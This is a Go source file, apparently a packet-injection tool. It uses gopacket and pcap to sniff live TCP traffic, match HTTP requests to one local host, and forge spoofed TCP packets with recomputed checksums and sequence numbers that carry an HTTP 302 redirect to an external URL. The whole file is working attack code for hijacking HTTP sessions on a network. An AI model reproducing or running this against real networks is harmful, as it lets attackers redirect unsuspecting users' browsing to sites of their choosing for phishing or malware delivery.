package main

import (
    "github.com/google/gopacket"
    "github.com/google/gopacket/pcap"
    // "github.com/google/gopacket/layers"

    "fmt"
    "bytes"
    "strings"
    "encoding/binary"
)

var (
    handle *pcap.Handle
)

const LinkLayer_Len uint16 = 14

func computeIPChecksum(buf []byte) (uint16) {

	var cksum uint32 = 0

	for i := 0 ; i < 20; i += 2 {
		cksum += uint32(binary.BigEndian.Uint16(buf[i+14:i+16]))
	}

	for ;cksum > 0xffff; {
		cksum = (cksum >> 16) + (cksum & 0xffff)
	}

	return ^uint16(cksum)
}

func computeTCPChecksum(buf []byte, l int) (uint16) {
	var cksum uint32 = 0
	l += 20

    //读伪头部
    for i := 0; i < 8; i += 2 {
		cksum += uint32(binary.BigEndian.Uint16(buf[i+26:i+28]))
	}

    cksum += 0x06
    cksum += uint32(l)

    for i := 0; i < l; i += 2 {
		cksum += uint32(binary.BigEndian.Uint16(buf[i+34:i+36]))
	}

	for ;cksum > 0xffff; {
		cksum = (cksum >> 16) + (cksum & 0xffff)
	}
    return ^uint16(cksum)
}

func handlePacket(packet gopacket.Packet, url string) {

    origin := packet.Data()

    appLayer := packet.ApplicationLayer()

    if (appLayer == nil) {
        return
    }

    app_content  := string( appLayer.Payload() )

    if !strings.Contains(app_content, "Host: 192.168.8.228:8080" ) { return }

    var buff bytes.Buffer

    // MAC Layer
    buff.Write(origin[6:12])
    buff.Write(origin[0: 6])
    buff.Write([]byte{0x08, 0x00})

    // IP Layer
    buff.Write([]byte{0x45, 0x00, 0x00, 0x00, 0x00, 0x00})
    buff.Write([]byte{0x40, 0x00, 0x40, 0x06})
    buff.Write([]byte{0x00, 0x00})

    buff.Write(origin[30:34])
    buff.Write(origin[26:30])

    local_endian := binary.BigEndian

    ip_header_len   := uint16( origin[14] & 0x0f * 4 )
    tcp_header_len  := uint16( origin[ip_header_len + 12] & 0xff * 4)

    seq_num         := local_endian.Uint32(origin[38: 42])

    total_len       := local_endian.Uint16(origin[16: 18])

    buff.Write(origin[36: 38])
    buff.Write(origin[34: 36])

    buff.Write(origin[42: 46])

    fmt.Println(total_len, ip_header_len, tcp_header_len)

    acknum := seq_num + uint32( total_len - ip_header_len - tcp_header_len )

    ackbytes := make([]byte, 4)
    local_endian.PutUint32(ackbytes, acknum)
    buff.Write(ackbytes)

    buff.Write([]byte{0x50, 0x18, 0x3d, 0x9f, 0x00, 0x00, 0x00, 0x00})

    //Application layer
    html := "HTTP/1.1 302 Found\r\n" +
    "Content-Type: text/html; charset=UTF-8\r\n" +
    "Location: "+ url + "\r\n" +
    "Content-Length: 0\r\n" +
    "Cache-control: no-cache\r\n" +
    "Connection: close\r\n\r\n"

    buff.WriteString(html)

    out := buff.Bytes()

    l := len(html)

    out[16] = byte(uint16(40 + l) >> 8);
    out[17] = byte(40 + l);

    check_sum_ip    := computeIPChecksum(out)

    out[24] = byte(check_sum_ip >> 8)
    out[25] = byte(check_sum_ip )

    check_sum_tcp   := computeTCPChecksum(out, l)

    out[50] = byte(check_sum_tcp >> 8)
    out[51] = byte(check_sum_tcp)

    handle.WritePacketData(out)

    fmt.Println(out)

}

func main() {

    handle, _ = pcap.OpenLive(
        "en0",
        1600,
        true,
        pcap.BlockForever,
    )

    handle.SetBPFFilter("tcp")

    url := "http://www.pheicloud.com"

    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

    fmt.Println("Inject Server Start")

    for packet := range packetSource.Packets() {

        handlePacket(packet, url)

    }

    defer handle.Close()

}
